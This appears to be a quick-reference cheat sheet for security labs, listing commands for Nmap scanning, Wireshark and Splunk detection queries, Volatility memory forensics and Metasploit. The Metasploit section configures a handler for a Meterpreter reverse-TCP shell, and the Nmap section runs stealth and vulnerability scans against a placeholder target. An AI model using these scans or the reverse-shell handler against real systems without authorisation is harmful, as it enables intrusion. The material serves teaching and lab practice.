# ⚡ Cybersecurity Tools Quick Reference Cheat Sheet

Essential command-line syntax and query references for key cybersecurity tools used in these labs.

---

## 🔍 Nmap (Network Scanning)

```bash
# Basic SYN Stealth Scan with OS & Version Detection
nmap -sS -sV -sC -O <TARGET_IP>

# Scan all 65,535 ports fast
nmap -p- --min-rate 5000 <TARGET_IP>

# UDP Scan for top ports
nmap -sU --top-ports 20 <TARGET_IP>

# Vulnerability Scanning using NSE scripts
nmap --script vuln <TARGET_IP>
```

---

## 🦈 Wireshark Display Filters

```wireshark
# Filter by IP Address
ip.addr == 192.168.1.50

# Filter HTTP POST requests (Credentials / Data exfiltration)
http.request.method == "POST"

# Detect DNS Exfiltration / Tunneling queries
dns.qry.name contains "malicious"

# Filter TCP Syn packets (Port scan detection)
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

---

## 📊 Splunk Search Processing Language (SPL)

```splunk
; Search failed SSH logins in last 24 hours
index=linux_logs event_id=Failed_Password | stats count by src_ip, user | sort - count

; Detect PowerShell Encoded Execution
index=windows_logs EventCode=4688 Process_Command_Line="*-enc*" 

; Count web traffic by status codes
index=web_access | stats count by status
```

---

## 🧪 Volatility 3 (RAM Memory Forensics)

```bash
# List all running processes and parent-child tree
vol -f memory.raw windows.pstree

# Scan for active network connections
vol -f memory.raw windows.netscan

# Search for injected code / unbacked memory pages
vol -f memory.raw windows.malfind

# Dump memory for specific PID
vol -f memory.raw -o ./output windows.dumpfiles --pid 4108
```

---

## 💥 Metasploit (Msfconsole)

```msfconsole
# Search for exploits by CVE or name
search cve:2021-44228
search type:exploit platform:windows smb

# Set payload & handler parameters
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
run
```
